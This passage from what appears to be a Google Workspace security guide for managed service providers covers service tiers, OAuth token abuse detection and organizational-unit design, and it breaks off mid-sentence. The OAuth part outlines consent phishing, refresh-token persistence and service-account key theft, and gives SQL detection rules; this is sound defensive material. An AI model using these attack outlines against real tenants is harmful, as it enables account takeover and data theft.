Area Key Activities Tier Monthly Threat Response Update detections for emerging threats, tune existing alerts All Quarterly Control Effectiveness Measure and optimize security control effectiveness All Quarterly Automation Improvement Identify manual processes for automation T2, T3 Semi-annual Configuration Optimization Review and tune security configuration All Semi-annual User Experience Assess and improve security usability All Annual Strategic Review Comprehensive security approach evaluation All Annual Architecture Review Evaluate security architecture effectiveness T2, T3 Annual Technology Evaluation Assess new security capabilities T2, T3"},{"location":"msp-implementation/#msp-security-service-tiers","title":"MSP Security Service Tiers","text":""},{"location":"msp-implementation/#tier-1-essential-security","title":"Tier 1: Essential Security","text":"<p>Target Clients: Small businesses, organizations with basic security requirements</p> <p>Implementation Focus: - Fundamental security controls and configurations - Basic threat protection mechanisms - Standardized security implementation across all Tier 1 clients</p> <p>Ongoing Management: - Reactive security alert handling - Basic security monitoring - Periodic security reviews - Security awareness support</p>"},{"location":"msp-implementation/#tier-2-enhanced-security","title":"Tier 2: Enhanced Security","text":"<p>Target Clients: Mid-size businesses, organizations with sensitive data, regulated industries</p> <p>Implementation Focus: - Comprehensive security controls beyond essentials - Advanced threat protection capabilities - Client-specific security requirements - Proactive risk management</p> <p>Ongoing Management: - Enhanced security monitoring and alerting - Regular security assessments and reporting - Proactive threat hunting - Comprehensive incident response support - Advanced security training</p>"},{"location":"msp-implementation/#tier-3-advanced-security","title":"Tier 3: Advanced Security","text":"<p>Target Clients: Enterprises, organizations with strict compliance requirements, high-risk industries</p> <p>Implementation Focus: - Maximum security configuration - Custom security controls and policies - Comprehensive security integration - Advanced detection and response capabilities</p> <p>Ongoing Management: - 24/7 security monitoring - Custom security dashboards and reporting - Advanced analytics and threat hunting - Complete incident response capabilities - Executive-level security governance support</p>"},{"location":"msp-implementation/#security-implementation-tools","title":"Security Implementation Tools","text":""},{"location":"msp-implementation/#assessment-tools","title":"Assessment Tools","text":"<ul> <li>Google Workspace Security Assessment Tool</li> <li>Google Security Checklist</li> <li>Security Configuration Validator</li> <li>Client Security Requirements Template</li> </ul>"},{"location":"msp-implementation/#implementation-tools","title":"Implementation Tools","text":"<ul> <li>Security Configuration Templates (by tier)</li> <li>Security Policy Templates</li> <li>Google Workspace Admin Console</li> <li>Google Cloud Identity</li> <li>Google Security Command Center</li> </ul>"},{"location":"msp-implementation/#management-tools","title":"Management Tools","text":"<ul> <li>Security Monitoring Dashboard</li> <li>Alert Management System</li> <li>Log Analysis Platform</li> <li>Compliance Reporting Templates</li> <li>Service Delivery Documentation</li> </ul>"},{"location":"msp-implementation/#critical-success-factors","title":"Critical Success Factors","text":"<ol> <li>Executive Sponsorship: Secure client leadership support for security implementation</li> <li>Clear Expectations: Establish detailed security responsibilities between MSP and client</li> <li>Phased Implementation: Prioritize critical controls before advancing to more complex measures</li> <li>User Impact Management: Balance security requirements with user experience considerations</li> <li>Continuous Validation: Regularly test and validate security control effectiveness</li> <li>Documentation Excellence: Maintain comprehensive documentation of security configurations</li> <li>Measurable Outcomes: Define and track security metrics to demonstrate value</li> <li>Adaptation Capability: Continuously evolve security controls to address emerging threats</li> </ol>"},{"location":"msp-implementation/#engagement-templates","title":"Engagement Templates","text":""},{"location":"msp-implementation/#client-security-assessment","title":"Client Security Assessment","text":"<pre><code>GOOGLE WORKSPACE SECURITY ASSESSMENT\n\nClient Name: [Client Name]\nDate: [Date]\nConducted By: [MSP Representative]\n\nEXECUTIVE SUMMARY\n[Brief summary of overall security posture]\n\nCURRENT SECURITY POSTURE\n[Detailed findings of current security state]\n\nRISK ASSESSMENT\n[Identified security risks and potential impacts]\n\nRECOMMENDED SECURITY TIER\n[Recommendation with justification]\n\nIMPLEMENTATION ROADMAP\n[High-level implementation timeline]\n\nAPPENDICES\n[Detailed configuration findings]\n</code></pre>"},{"location":"msp-implementation/#security-implementation-plan","title":"Security Implementation Plan","text":"<pre><code>GOOGLE WORKSPACE SECURITY IMPLEMENTATION PLAN\n\nClient Name: [Client Name]\nSecurity Tier: [Tier Level]\nImplementation Period: [Start Date] to [End Date]\n\nPHASE 1: [Phase Name]\nTimeline: [Dates]\nTasks:\n- [Task 1]\n- [Task 2]\nResponsible Parties:\n- [MSP]: [Actions]\n- [Client]: [Actions]\nDeliverables:\n- [Deliverable 1]\n- [Deliverable 2]\n\n[Repeat for all phases]\n\nACCEPTANCE CRITERIA\n[Specific criteria for successful implementation]\n\nASSUMPTIONS AND PREREQUISITES\n[List of assumptions and requirements]\n</code></pre>"},{"location":"msp-implementation/#monthly-security-report","title":"Monthly Security Report","text":"<pre><code>GOOGLE WORKSPACE SECURITY STATUS REPORT\n\nClient Name: [Client Name]\nPeriod: [Month Year]\nPrepared By: [MSP Representative]\n\nSECURITY POSTURE SUMMARY\n[Overview of current security status]\n\nSECURITY METRICS\n- [Metric 1]: [Value] [Trend]\n- [Metric 2]: [Value] [Trend]\n\nNOTABLE SECURITY EVENTS\n[Summary of significant security events]\n\nSECURITY IMPROVEMENTS IMPLEMENTED\n[List of security enhancements]\n\nRECOMMENDED ACTIONS\n[Suggested improvements]\n\nUPCOMING SECURITY ACTIVITIES\n[Planned security initiatives]\n</code></pre> <p>Note: This implementation guide should be customized based on each client's specific requirements, regulatory considerations, and risk profile.</p>"},{"location":"oauth-token-analysis/","title":"OAuth Token Analysis","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"oauth-token-analysis/#oauth-token-analysis-and-authentication-audit-log-interpretation","title":"OAuth Token Analysis and Authentication Audit Log Interpretation","text":"<p>This guide provides security professionals with detailed techniques for analyzing OAuth tokens and interpreting authentication audit logs in Google Workspace environments to detect and respond to security threats.</p>"},{"location":"oauth-token-analysis/#oauth-token-security-fundamentals","title":"OAuth Token Security Fundamentals","text":""},{"location":"oauth-token-analysis/#understanding-oauth-token-architecture-in-google-workspace","title":"Understanding OAuth Token Architecture in Google Workspace","text":"<p>OAuth tokens serve as the foundation for service-to-service and third-party application authentication in Google Workspace. Their compromise can lead to persistent access without requiring user credentials.</p>"},{"location":"oauth-token-analysis/#token-types-and-security-implications","title":"Token Types and Security Implications","text":"Token Type Description Security Considerations Access Tokens Short-lived tokens (1-hour typical lifespan) that grant immediate access Theft allows temporary access; limited persistence value Refresh Tokens Long-lived tokens that can obtain new access tokens Primary persistence mechanism; theft enables long-term access ID Tokens JWT tokens containing identity information Can leak user identity information if intercepted Service Account Keys JSON credentials for service accounts Highest risk; equivalent to permanent credentials Authorization Codes Short-lived codes exchanged for tokens Vulnerable during exchange process; MITM attack target"},{"location":"oauth-token-analysis/#oauth-scope-security-classification","title":"OAuth Scope Security Classification","text":"<p>Develop a risk-based classification system for OAuth scopes:</p> <p>Critical Risk Scopes: - <code>https://www.googleapis.com/auth/admin.directory.user</code> (User management) - <code>https://mail.google.com/</code> (Full Gmail access) - <code>https://www.googleapis.com/auth/drive</code> (Full Drive access) - <code>https://www.googleapis.com/auth/cloud-platform</code> (GCP access) - <code>https://www.googleapis.com/auth/admin.directory.*</code> (Any admin directory access)</p> <p>High Risk Scopes: - <code>https://www.googleapis.com/auth/gmail.modify</code> (Gmail modification) - <code>https://www.googleapis.com/auth/drive.file</code> (Access to files created/opened by app) - <code>https://www.googleapis.com/auth/calendar</code> (Full calendar access) - <code>https://www.googleapis.com/auth/contacts</code> (Contact access)</p> <p>Moderate Risk Scopes: - <code>https://www.googleapis.com/auth/gmail.readonly</code> (Read-only Gmail) - <code>https://www.googleapis.com/auth/drive.readonly</code> (Read-only Drive) - <code>https://www.googleapis.com/auth/calendar.readonly</code> (Read-only Calendar)</p>"},{"location":"oauth-token-analysis/#token-abuse-detection-techniques","title":"Token Abuse Detection Techniques","text":""},{"location":"oauth-token-analysis/#analyzing-token-audit-logs","title":"Analyzing Token Audit Logs","text":"<p>Google Workspace provides token-related audit events that can reveal suspicious activity. Key events to monitor:</p>"},{"location":"oauth-token-analysis/#critical-token-events","title":"Critical Token Events","text":"Event Type Description Suspicious Indicators <code>AUTHORIZE</code> User authorization of OAuth application First-time appearance of application, unusual scope combinations, authorization outside business hours <code>REVOKE</code> Token revocation Immediate reauthorization after revocation, selective token revocation <code>TOKEN_REVOKE</code> Admin revocation of tokens Revocation followed by suspicious auth attempts <code>AUTHENTICATION</code> Service account token issuance Unusual service account activity, excessive token generation <code>SERVICE_ACCOUNT_KEY_CREATED</code> Creation of service account key Unauthorized creation, excessive key creation"},{"location":"oauth-token-analysis/#behavioral-analysis-for-token-activity","title":"Behavioral Analysis for Token Activity","text":"<p>Implement detection rules based on token behavior patterns:</p>"},{"location":"oauth-token-analysis/#token-velocity-analysis","title":"Token Velocity Analysis","text":"<ul> <li>Baseline: Establish normal token request patterns per user/application</li> <li>Detection: Alert on significant deviations in token request frequency</li> <li>Implementation:    <pre><code>SELECT user_email, application_name, COUNT(token_id) as token_count\nFROM token_audit_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\nGROUP BY user_email, application_name\nHAVING token_count &gt; \n  (SELECT AVG(daily_tokens) + 3*STDDEV(daily_tokens) \n   FROM token_baselines \n   WHERE app_category = 'same_category')\n</code></pre></li> </ul>"},{"location":"oauth-token-analysis/#token-usage-analysis","title":"Token Usage Analysis","text":"<ul> <li>Baseline: Document normal resource access patterns per token</li> <li>Detection: Identify tokens accessing unusual resource combinations</li> <li>Implementation: Track API endpoint access patterns and look for anomalies</li> </ul>"},{"location":"oauth-token-analysis/#cross-user-token-pattern-analysis","title":"Cross-User Token Pattern Analysis","text":"<ul> <li>Baseline: Identify normal application adoption patterns</li> <li>Detection: Alert on applications obtaining authorization from unusual user combinations</li> <li>Example: Application suddenly authorized by finance, HR, and executive users in short timeframe</li> </ul>"},{"location":"oauth-token-analysis/#authentication-log-analysis-framework","title":"Authentication Log Analysis Framework","text":""},{"location":"oauth-token-analysis/#key-authentication-event-types","title":"Key Authentication Event Types","text":"Event Type Description Security Value <code>login_success</code> Successful login event Establish authentication baseline, detect account takeover <code>login_failure</code> Failed login attempt Identify brute force, password spraying, credential stuffing <code>login_verification</code> Second factor verification Track MFA usage, detect MFA bypass attempts <code>login_challenge</code> Additional verification prompted Monitor risk-based challenges, detect unusual auth patterns <code>password_edit</code> Password change event Detect unauthorized credential changes, potential persistence <code>2sv_disable</code> Two-step verification disabled Critical security control modification, potential account takeover <code>reauth</code> Re-authentication event Track session management, detect session hijacking attempts <code>account_disabled</code> Account suspension or disabling Monitor administrative actions, detect unauthorized changes <code>recovery_email_edit</code> Change to recovery email Critical security control modification, potential account takeover"},{"location":"oauth-token-analysis/#advanced-authentication-analysis-techniques","title":"Advanced Authentication Analysis Techniques","text":""},{"location":"oauth-token-analysis/#frequency-based-detection","title":"Frequency-Based Detection","text":"<ul> <li>Login Velocity: Alert on rapid authentication attempts exceeding normal patterns</li> <li>Failed Attempt Patterns: Identify distributed credential stuffing through pattern recognition</li> <li>Successful/Failed Ratio Analysis: Detect credential testing through changing success ratio</li> </ul>"},{"location":"oauth-token-analysis/#location-based-detection","title":"Location-Based Detection","text":"<ul> <li>Impossible Travel: Alert on authentications from geographically distant locations</li> <li>First-Time Location: Identify first-time access from new countries/regions</li> <li>Location-Role Mismatch: Detect authentications from locations inappropriate for role</li> </ul>"},{"location":"oauth-token-analysis/#time-based-detection","title":"Time-Based Detection","text":"<ul> <li>After-Hours Authentication: Alert on access during unusual hours for specific user roles</li> <li>Authentication Gap Analysis: Identify unusual gaps or changes in authentication patterns</li> <li>Time of Day Shift: Detect gradual shifts in authentication timing (potential compromise)</li> </ul>"},{"location":"oauth-token-analysis/#device-based-detection","title":"Device-Based Detection","text":"<ul> <li>Device Switching: Alert on rapid changes between multiple devices</li> <li>New Device + Sensitive Access: Detect new devices immediately accessing sensitive resources</li> <li>Device Factor Changes: Monitor changes in device identification factors</li> </ul>"},{"location":"oauth-token-analysis/#practical-token-attack-detection","title":"Practical Token Attack Detection","text":""},{"location":"oauth-token-analysis/#oauth-phishing-detection","title":"OAuth Phishing Detection","text":"<p>OAuth phishing involves tricking users into authorizing malicious applications. Detection techniques:</p> <ol> <li>Application Reputation Analysis</li> <li>Maintain database of known-good applications with expected scopes</li> <li>Alert on first-time appearance of applications in your environment</li> <li> <p>Implement application risk scoring based on developer reputation, user base</p> </li> <li> <p>Scope Mismatch Detection</p> </li> <li>Document expected scope combinations for application types</li> <li>Alert on applications requesting scope combinations that don't match their declared purpose</li> <li> <p>Example: A document viewer requesting Gmail modification scopes</p> </li> <li> <p>Authorization Timing Analysis</p> </li> <li>Monitor for authorizations that occur immediately after suspicious email clicks</li> <li>Correlate phishing email reports with OAuth authorization events</li> <li>Track authorizations that follow unusual login patterns</li> </ol>"},{"location":"oauth-token-analysis/#token-theft-detection","title":"Token Theft Detection","text":"<p>Detect scenarios where valid tokens are stolen and used by unauthorized parties:</p> <ol> <li>Access Pattern Changes</li> <li>Establish baseline API call patterns per token/application</li> <li>Alert on sudden changes in API call patterns or accessed resources</li> <li> <p>Monitor for tokens suddenly accessing sensitive data they haven't before</p> </li> <li> <p>Client Fingerprint Analysis</p> </li> <li>Track client attributes associated with token usage (IP, user agent, TLS fingerprint)</li> <li>Alert on token usage from new client fingerprints</li> <li> <p>Detect simultaneous token usage from multiple client fingerprints</p> </li> <li> <p>Usage Timing Analysis</p> </li> <li>Document normal token usage time patterns</li> <li>Alert on token usage outside expected hours/days</li> <li>Detect unusual gaps followed by high-activity periods</li> </ol>"},{"location":"oauth-token-analysis/#service-account-token-abuse","title":"Service Account Token Abuse","text":"<p>Service accounts present special security challenges due to their privileged access:</p> <ol> <li>Service Account Inventory Management</li> <li>Maintain complete inventory of authorized service accounts</li> <li>Document expected usage patterns, access needs, and owners</li> <li> <p>Regularly audit service account permissions</p> </li> <li> <p>Key Creation and Usage Monitoring</p> </li> <li>Alert on new service account key creation</li> <li>Monitor service account key age and implement rotation policies</li> <li> <p>Track key usage patterns and alert on deviations</p> </li> <li> <p>Domain-Wide Delegation Monitoring</p> </li> <li>Document service accounts with domain-wide delegation</li> <li>Strictly limit and monitor scope assignments</li> <li>Implement additional monitoring for delegated access activities</li> </ol>"},{"location":"oauth-token-analysis/#real-world-attack-scenario-analysis","title":"Real-World Attack Scenario Analysis","text":""},{"location":"oauth-token-analysis/#case-study-1-targeted-oauth-phishing-campaign","title":"Case Study 1: Targeted OAuth Phishing Campaign","text":"<p>Attack Scenario: 1. Attacker sends convincing document sharing email appearing to come from a colleague 2. Link leads to a fake document viewer requiring OAuth authorization 3. Application requests Gmail and Drive access scopes 4. Upon authorization, attacker uses access to:    - Search emails for sensitive information    - Exfiltrate targeted documents    - Set up mail forwarding rules for persistence</p> <p>Detection Opportunities: - Application authorization from multiple users in short timeframe - Unusual scope combinations for document viewer application - Suspicious API call patterns following authorization - Mail rule creation after OAuth authorization</p> <p>Detection Rule Example: <pre><code>SELECT user_email, application_name, requested_scopes, timestamp\nFROM token_audit_logs\nWHERE event_type = 'AUTHORIZE'\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND application_name NOT IN (SELECT app_name FROM approved_applications)\n  AND (\n    requested_scopes LIKE '%gmail.modify%' OR\n    requested_scopes LIKE '%gmail.compose%' OR\n    requested_scopes LIKE '%gmail.settings%'\n  )\n  AND EXISTS (\n    SELECT 1 FROM mail_rule_logs\n    WHERE created_by = user_email\n      AND rule_creation_time BETWEEN timestamp AND TIMESTAMP_ADD(timestamp, INTERVAL 1 HOUR)\n      AND rule_action = 'forward'\n  )\nORDER BY timestamp;\n</code></pre></p>"},{"location":"oauth-token-analysis/#case-study-2-refresh-token-persistence","title":"Case Study 2: Refresh Token Persistence","text":"<p>Attack Scenario: 1. Attacker initially gains access through phishing or other means 2. Creates OAuth application requesting Drive and Gmail access 3. Tricks legitimate user into authorizing application 4. Attacker maintains access through refresh token even after credential changes 5. Uses access intermittently to avoid detection</p> <p>Detection Opportunities: - Unusual application authorization patterns - API calls from application continuing after password reset - Sporadic access patterns inconsistent with legitimate use - Access from unusual geographic locations for the application</p> <p>Response Procedure: 1. Identify all tokens issued to the suspicious application 2. Review access logs to determine data exposure 3. Revoke all tokens for the identified application 4. Block application by client ID at the organizational level 5. Search for similar applications using pattern matching 6. Scan for any persistence mechanisms established during access</p>"},{"location":"oauth-token-analysis/#case-study-3-service-account-key-compromise","title":"Case Study 3: Service Account Key Compromise","text":"<p>Attack Scenario: 1. Attacker gains access to development environment or code repository 2. Extracts embedded service account key with broad permissions 3. Uses service account access to extract data across multiple users 4. Creates additional service accounts for persistence</p> <p>Detection Opportunities: - Service account usage from unusual IP addresses - Access pattern changes for the service account - Unusual API call volume or resource access - New service account creation or key generation</p> <p>Detection Rule Example: <pre><code>SELECT sa_email, client_ip, COUNT(DISTINCT accessed_resource) as resource_count\nFROM service_account_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND sa_email = 'compromised-service@project-id.iam.gserviceaccount.com'\n  AND client_ip NOT IN (SELECT allowed_ip FROM service_account_allow_list WHERE sa_email = 'compromised-service@project-id.iam.gserviceaccount.com')\nGROUP BY sa_email, client_ip\nHAVING resource_count &gt; 10\nORDER BY resource_count DESC;\n</code></pre></p>"},{"location":"oauth-token-analysis/#implementation-of-token-focused-security-controls","title":"Implementation of Token-Focused Security Controls","text":""},{"location":"oauth-token-analysis/#preventative-controls","title":"Preventative Controls","text":"<ol> <li>OAuth App Whitelisting</li> <li>Implement domain-wide app access control in Google Admin Console</li> <li>Configure API access control settings</li> <li> <p>Create an application approval process</p> </li> <li> <p>Sensitive Scope Restrictions</p> </li> <li>Limit access to sensitive scopes (Gmail, Drive, Admin)</li> <li>Require advanced verification for apps requesting sensitive scopes</li> <li> <p>Implement additional approval for critical scopes</p> </li> <li> <p>Service Account Governance</p> </li> <li>Implement service account key rotation requirements</li> <li>Configure service account access boundaries</li> <li>Establish approval process for domain-wide delegation</li> </ol>"},{"location":"oauth-token-analysis/#detective-controls","title":"Detective Controls","text":"<ol> <li>Token Activity Monitoring</li> <li>Create alerts for critical scope authorizations</li> <li>Monitor application usage across users</li> <li> <p>Track token usage patterns and anomalies</p> </li> <li> <p>Authorization Analytics</p> </li> <li>Develop risk scoring for application authorizations</li> <li>Create dashboards for OAuth application visibility</li> <li> <p>Implement anomaly detection for authorization patterns</p> </li> <li> <p>Authentication Correlation</p> </li> <li>Link authentication events with token activities</li> <li>Correlate MFA changes with token issuance</li> <li>Track relationship between password changes and token usage</li> </ol>"},{"location":"oauth-token-analysis/#responsive-controls","title":"Responsive Controls","text":"<ol> <li>Token Revocation Capabilities</li> <li>Implement bulk token revocation procedures</li> <li>Create automated response playbooks</li> <li> <p>Test token revocation impact before implementation</p> </li> <li> <p>Application Blocking</p> </li> <li>Establish procedures for blacklisting malicious applications</li> <li>Implement client ID blocking mechanisms</li> <li> <p>Create application block list with known malicious apps</p> </li> <li> <p>User Communication Procedures</p> </li> <li>Develop template for notifying users of suspicious authorizations</li> <li>Create self-service token review capabilities</li> <li>Implement automated notifications for high-risk authorizations</li> </ol>"},{"location":"oauth-token-analysis/#advanced-token-forensic-analysis","title":"Advanced Token Forensic Analysis","text":""},{"location":"oauth-token-analysis/#extracting-intelligence-from-token-metadata","title":"Extracting Intelligence from Token Metadata","text":"<p>Token-related logs contain valuable metadata for forensic analysis:</p> <ol> <li>Client Analysis</li> <li>Extract and analyze user agent patterns</li> <li>Identify anomalous client fingerprints</li> <li> <p>Correlate client information across multiple token uses</p> </li> <li> <p>Developer Identity Analysis</p> </li> <li>Extract application developer information</li> <li>Research developer reputation and history</li> <li> <p>Identify patterns of suspicious developer activities</p> </li> <li> <p>Token Lifecycle Analysis</p> </li> <li>Map complete token lifecycle from issuance to use to revocation</li> <li>Identify unusual gaps or patterns in usage</li> <li>Correlate token usage with other user activities</li> </ol>"},{"location":"oauth-token-analysis/#reverse-engineering-token-usage","title":"Reverse Engineering Token Usage","text":"<p>When investigating suspicious token activity:</p> <ol> <li>API Call Reconstruction</li> <li>Map sequence of API calls made using the token</li> <li>Reconstruct attacker methodologies and targets</li> <li> <p>Identify data potentially accessed or exfiltrated</p> </li> <li> <p>Access Pattern Analysis</p> </li> <li>Determine temporal patterns in resource access</li> <li>Identify search patterns indicating targeting</li> <li> <p>Map potential data exfiltration pathways</p> </li> <li> <p>Cross-Service Correlation</p> </li> <li>Track lateral movement between Google services</li> <li>Identify relationships between token access and other activities</li> <li>Correlate token usage with authentication events</li> </ol>"},{"location":"oauth-token-analysis/#token-security-roadmap-for-msps","title":"Token Security Roadmap for MSPs","text":""},{"location":"oauth-token-analysis/#implementation-phases","title":"Implementation Phases","text":"<p>Phase 1: Visibility and Baseline - Implement comprehensive token logging - Establish application inventory and baseline - Develop token usage baselines for clients</p> <p>Phase 2: Monitoring and Detection - Deploy basic token monitoring alerts - Implement critical scope authorization approval - Develop application risk assessment methodology</p> <p>Phase 3: Advanced Controls - Deploy machine learning for token anomaly detection - Implement automated response for suspicious tokens - Develop cross-tenant token threat intelligence</p>"},{"location":"oauth-token-analysis/#cross-tenant-token-threat-intelligence","title":"Cross-Tenant Token Threat Intelligence","text":"<p>MSPs should leverage insights across multiple tenants:</p> <ol> <li>Anonymous Threat Sharing</li> <li>Share suspicious application indicators across clients</li> <li>Develop common IOCs for token-based attacks</li> <li> <p>Create centralized risk scoring for OAuth applications</p> </li> <li> <p>Common Detection Content</p> </li> <li>Develop standardized detection rules deployable across tenants</li> <li>Create common response playbooks</li> <li> <p>Establish consistent security standards for token governance</p> </li> <li> <p>Collective Defense Strategy</p> </li> <li>Implement rapid blocking of known malicious applications</li> <li>Share anonymized attack pattern information</li> <li>Develop joint incident response capabilities</li> </ol>"},{"location":"oauth-token-analysis/#resources-and-tools","title":"Resources and Tools","text":""},{"location":"oauth-token-analysis/#google-workspace-security-tools","title":"Google Workspace Security Tools","text":"<ul> <li>Token Audit API: https://developers.google.com/admin-sdk/reports/v1/guides/manage-audit-tokens</li> <li>OAuth Application Verification: https://support.google.com/cloud/answer/7454865</li> <li>Service Account Best Practices: https://cloud.google.com/iam/docs/best-practices-for-managing-service-accounts</li> </ul>"},{"location":"oauth-token-analysis/#open-source-analysis-tools","title":"Open Source Analysis Tools","text":"<ul> <li>Token Analyzer: Tools for parsing and analyzing OAuth token structure</li> <li>JWT Decoder: https://jwt.io/ for analyzing token contents</li> <li>OAuth Scanner: Tools for identifying risky OAuth applications</li> </ul>"},{"location":"oauth-token-analysis/#additional-resources","title":"Additional Resources","text":"<ul> <li>Google API Explorer: https://developers.google.com/apis-explorer</li> <li>OAuth 2.0 Security Best Practices: https://tools.ietf.org/html/draft-ietf-oauth-security-topics</li> <li>MITRE ATT&amp;CK for OAuth Abuse: https://attack.mitre.org/techniques/T1550/001/</li> </ul> <p>Note: This guide should be adapted to your specific environment and integrated with your broader security monitoring strategy.</p>"},{"location":"organizational-units/","title":"Organizational Units","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"organizational-units/#google-workspace-organizational-unit-security-design","title":"Google Workspace Organizational Unit Security Design","text":"<p>This guide provides security professionals and MSPs with comprehensive strategies for designing and implementing secure organizational unit (OU) structures in Google Workspace environments. Proper OU design is fundamental to effective security implementation and management.</p>"},{"location":"organizational-units/#organizational-unit-fundamentals","title":"Organizational Unit Fundamentals","text":""},{"location":"organizational-units/#understanding-ou-architecture","title":"Understanding OU Architecture","text":"<p>Organizational Units in Google Workspace provide a hierarchical structure for managing users, applying policies, and controlling access. Key concepts include:</p> <ol> <li>Inheritance Model</li> <li>Settings flow from parent OUs to child OUs</li> <li>Child OUs inherit settings unless explicitly overridden</li> <li> <p>Inheritance can be selectively blocked for specific settings</p> </li> <li> <p>Default Configuration</p> </li> <li>All Google Workspace accounts start with a root OU</li> <li>All users initially belong to the root OU</li> <li> <p>Settings applied at the root level affect all users by default</p> </li> <li> <p>Access Control Implications</p> </li> <li>OU structure determines policy application</li> <li>Admin privileges can be scoped to specific OUs</li> <li>Service availability controlled at the OU level</li> </ol>"},{"location":"organizational-units/#ou-security-design-principles","title":"OU Security Design Principles","text":"<p>When designing a secure OU structure, follow these core principles:</p> <ol> <li>Least Privilege Model</li> <li>Group users based on required access levels</li> <li>Apply restrictions at the highest possible level</li> <li> <p>Grant exceptions only where necessary</p> </li> <li> <p>Administrative Segregation</p> </li> <li>Separate administrative boundaries</li> <li>Delegate admin rights at appropriate OU levels</li> <li> <p>Implement administrative isolation for sensitive departments</p> </li> <li> <p>Security Consistency</p> </li> <li>Maintain consistent security controls across similar OUs</li> <li>Document security baselines for each OU level</li> <li> <p>Implement change control for OU structure modifications</p> </li> <li> <p>Operational Efficiency</p> </li> <li>Balance security with management overhead</li> <li>Design for scalability as organization grows</li> <li>Minimize exceptions and special cases</li> </ol>"},{"location":"organizational-units/#strategic-ou-design-patterns","title":"Strategic OU Design Patterns","text":""},{"location":"organizational-units/#pattern-1-security-oriented-hierarchy","title":"Pattern 1: Security-Oriented Hierarchy","text":"<p>This pattern prioritizes security boundaries and regulatory compliance:</p> <pre><code>Root\n\u251c\u2500\u2500 Security Tier 1 (Highest Security)\n\u2502   \u251c\u2500\u2500 Executive Leadership\n\u2502   \u251c\u2500\u2500 Finance\n\u2502   \u2514\u2500\u2500 Legal\n\u251c\u2500\u2500 Security Tier 2 (Enhanced Security)\n\u2502   \u251c\u2500\u2500 Engineering\n\u2502   \u251c\u2500\u2500 Product Management\n\u2502   \u2514\u2500\u2500 Human Resources\n\u251c\u2500\u2500 Security Tier 3 (Standard Security)\n\u2502   \u251c\u2500\u2500 Marketing\n\u2502   \u251c\u2500\u2500 Sales\n\u2502   \u2514\u2500\u2500 Customer Support\n\u2514\u2500\u2500 Special Access\n    \u251c\u2500\u2500 Contractors\n    \u251c\u2500\u2500 Partners\n    \u2514\u2500\u2500 Temporary\n</code></pre> <p>Implementation Considerations: - Apply MFA requirements consistently within each tier - Implement stricter data controls as you move up the hierarchy - Configure service access based on security requirements</p>"},{"location":"organizational-units/#pattern-2-functional-hierarchy","title":"Pattern 2: Functional Hierarchy","text":"<p>This pattern organizes OUs based on department function:</p> <pre><code>Root\n\u251c\u2500\u2500 Corporate Services\n\u2502   \u251c\u2500\u2500 Executive\n\u2502   \u251c\u2500\u2500 Finance\n\u2502   \u251c\u2500\u2500 HR\n\u2502   \u2514\u2500\u2500 Legal\n\u251c\u2500\u2500 Revenue Generation\n\u2502   \u251c\u2500\u2500 Sales\n\u2502   \u251c\u2500\u2500 Marketing\n\u2502   \u2514\u2500\u2500 Business Development\n\u251c\u2500\u2500 Product Development\n\u2502   \u251c\u2500\u2500 Engineering\n\u2502   \u251c\u2500\u2500 Product Management\n\u2502   \u2514\u2500\u2500 Design\n\u251c\u2500\u2500 Customer Operations\n\u2502   \u251c\u2500\u2500 Support\n\u2502   \u251c\u2500\u2500 Success\n\u2502   \u2514\u2500\u2500 Training\n\u2514\u2500\u2500 External Collaborators\n    \u251c\u2500\u2500 Vendors\n    \u251c\u2500\u2500 Partners\n    \u2514\u2500\u2500 Contractors\n</code></pre> <p>Implementation Considerations: - Apply security policies based on department-specific risks - Customize service access by functional requirements - Implement data sharing controls between departments</p>"},{"location":"organizational-units/#pattern-3-geographic-hierarchy","title":"Pattern 3: Geographic Hierarchy","text":"<p>For organizations with regional security or compliance requirements:</p> <pre><code>Root\n\u251c\u2500\u2500 North America\n\u2502   \u251c\u2500\u2500 USA (CCPA Compliant)\n\u2502   \u2502   \u251c\u2500\u2500 HQ\n\u2502   \u2502   \u2514\u2500\u2500 Remote\n\u2502   \u2514\u2500\u2500 Canada (PIPEDA Compliant)\n\u251c\u2500\u2500 Europe (GDPR Compliant)\n\u2502   \u251c\u2500\u2500 EU Members\n\u2502   \u2514\u2500\u2500 UK\n\u251c\u2500\u2500 Asia Pacific\n\u2502   \u251c\u2500\u2500 Australia\n\u2502   \u251c\u2500\u2500 Singapore\n\u2502   \u2514\u2500\u2500 Japan\n\u2514\u2500\u2500 Global Roles\n    \u251c\u2500\u2500 Executive\n    \u251c\u2500\u2500 IT Administration\n    \u2514\u2500\u2500 Security\n</code></pre> <p>Implementation Considerations: - Apply region-specific compliance settings at regional OUs - Implement appropriate data residency controls - Configure service access based on regional availability</p>"},{"location":"organizational-units/#pattern-4-multi-tenant-msp-structure","title":"Pattern 4: Multi-Tenant MSP Structure","text":"<p>For MSPs managing multiple client environments:</p> <pre><code>Root\n\u251c\u2500\u2500 MSP Internal\n\u2502   \u251c\u2500\u2500 Administration\n\u2502   \u251c\u2500\u2500 Engineering\n\u2502   \u251c\u2500\u2500 Support\n\u2502   \u2514\u2500\u2500 Management\n\u251c\u2500\u2500 Client Tier 1 (Enterprise)\n\u2502   \u251c\u2500\u2500 Client A\n\u2502   \u2502   \u251c\u2500\u2500 Admin\n\u2502   \u2502   \u251c\u2500\u2500 Standard\n\u2502   \u2502   \u2514\u2500\u2500 Restricted\n\u2502   \u2514\u2500\u2500 Client B\n\u2502       \u251c\u2500\u2500 Admin\n\u2502       \u251c\u2500\u2500 Standard\n\u2502       \u2514\u2500\u2500 Restricted\n\u251c\u2500\u2500 Client Tier 2 (Mid-Market)\n\u2502   \u251c\u2500\u2500 Client C\n\u2502   \u2514\u2500\u2500 Client D\n\u2514\u2500\u2500 Client Tier 3 (Small Business)\n    \u251c\u2500\u2500 Client E\n    \u2514\u2500\u2500 Client F\n</code></pre> <p>Implementation Considerations: - Implement strong isolation between client environments - Apply standardized security baselines by client tier - Configure delegated administration with appropriate boundaries</p>"},{"location":"organizational-units/#security-controls-by-ou-layer","title":"Security Controls by OU Layer","text":"<p>For each layer in your OU hierarchy, implement appropriate security 